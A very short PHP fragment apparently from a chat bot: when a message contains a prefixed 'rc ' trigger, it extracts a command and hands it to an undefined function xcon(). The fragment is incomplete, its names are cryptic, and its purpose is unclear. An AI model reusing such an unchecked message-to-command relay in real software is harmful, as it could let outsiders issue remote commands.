<?php	
  if (strpos($msgr,ixz.'rc ') !== false)
    { 
$commndzz = rconcmommnd($msgr);
	  //
	xcon($commndzz.'', '');
	}
?>
 
